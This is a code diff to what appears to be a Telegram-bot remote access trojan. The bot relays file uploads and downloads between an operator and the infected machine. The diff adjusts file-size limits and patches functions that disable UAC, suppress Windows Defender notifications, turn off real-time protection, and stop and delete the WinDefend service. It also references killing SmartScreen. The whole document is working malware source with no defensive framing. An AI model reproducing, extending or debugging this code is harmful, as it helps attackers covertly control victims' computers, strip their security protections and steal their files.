@@ -247,17 +247,17 @@ def send_photo(message):
 # Prompts user to send file
 @bot.message_handler(commands=['upload'])
 def upload_command(message):
-    bot.send_message(message.chat.id, "Please send a file to upload (Max 2GB).")
+    bot.send_message(message.chat.id, "Please send a file to upload (Max 20MB).")
     bot.register_next_step_handler(message, handle_document)
 
 # Handles file uploads
 def handle_document(message):
     if message.content_type == 'document':
         file_size = message.document.file_size
-        file_limit = 2 * 1024 * 1024 * 1024
+        file_limit = 20 * 1024 * 1024
 
         if file_size > file_limit:
-            bot.reply_to(message, "File is too large to upload. Maximum allowed size is 2GB.")
+            bot.reply_to(message, "File is too large to upload. Maximum allowed size is 20MB.")
             return
 
         try:
@@ -292,8 +292,8 @@ def download_command(message):
         return
 
     file_size = os.path.getsize(file_path)
-    if file_size > 2 * 1024 * 1024 * 1024:
-        bot.send_message(message.chat.id, "File is too large to send (exceeds 2 GB limit).")
+    if file_size > 50 * 1024 * 1024:
+        bot.send_message(message.chat.id, "File is too large to send (exceeds 50 MB limit).")
         return
 
     try:
@@ -1145,6 +1145,8 @@ def run_as_admin():
 
 # Disable UAC by modifying registry
 def disable_uac():
+    script_path = None 
+
     try:
         reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
     except FileNotFoundError:
@@ -1182,11 +1184,13 @@ def disable_uac():
 
     finally:
         winreg.CloseKey(reg_key)
-        if os.path.exists(script_path):
+        if script_path and os.path.exists(script_path):
             os.remove(script_path)
 
 # Disable UAC admin prompt by modifying registry
 def disable_uac_prompt():
+    script_path = None
+
     try:
         reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
     except FileNotFoundError:
@@ -1224,11 +1228,13 @@ def disable_uac_prompt():
 
     finally:
         winreg.CloseKey(reg_key)
-        if os.path.exists(script_path):
+        if script_path and os.path.exists(script_path):
             os.remove(script_path)
 
 # Suppress Defender Notifications by modifying registry
 def suppress_windows_defender_notifications():
+    script_path = None
+
     try:
         reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Microsoft\Windows Defender\UX Configuration", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
     except FileNotFoundError:
@@ -1266,11 +1272,13 @@ def suppress_windows_defender_notifications():
 
     finally:
         winreg.CloseKey(reg_key)
-        if os.path.exists(script_path):
+        if script_path and os.path.exists(script_path):
             os.remove(script_path)
 
 # Disable Defender Real-Time Protection by modifying registry
 def disable_defender_realtime_protection():
+    script_path = None
+
     try:
         reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
     except FileNotFoundError:
@@ -1308,39 +1316,37 @@ def disable_defender_realtime_protection():
 
     finally:
         winreg.CloseKey(reg_key)
-        if os.path.exists(script_path):
+        if script_path and os.path.exists(script_path):
             os.remove(script_path)
 
 # Disable startup, stop and delete WinDefend
 def manage_windows_defender():
-    try:
-        powershell_script = """
-        sc config WinDefend start= disabled
-        sc stop WinDefend
-        sc delete WinDefend
-        """
-        
-        script_path = os.path.join(os.getenv('TEMP'), 'manage_windows_defender.ps1')
-        
-        with open(script_path, 'w') as script_file:
-            script_file.write(powershell_script)
-        
+    commands = [
+        ["sc", "config", "WinDefend", "start=", "disabled"],
+        ["sc", "stop", "WinDefend"],
+        ["sc", "delete", "WinDefend"]
+    ]
+
+    for command in commands:
         result = subprocess.run(
-            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
-            shell=True,
+            command,
+            shell=False,
+            stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             creationflags=subprocess.CREATE_NO_WINDOW
         )
-        
-        if result.returncode != 0:
-            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
-        
-    except Exception as e:
-        pass
 
-    finally:
-        if os.path.exists(script_path):
-            os.remove(script_path)
+        print(f"Command: {' '.join(command)}")
+        print(f"stdout: {result.stdout.decode('utf-8')}")
+        print(f"stderr: {result.stderr.decode('utf-8')}")
+
+        if result.returncode != 0:
+            error_msg = f"Error running command: {' '.join(command)}\n"
+            error_msg += f"stderr: {result.stderr.decode('utf-8')}\n"
+            error_msg += f"stdout: {result.stdout.decode('utf-8')}"
+            raise Exception(error_msg)
+        else:
+            print(f"Command executed successfully: {' '.join(command)}")
 
 # Change permission, kill and delete smartscreen
 def manage_smartscreen():
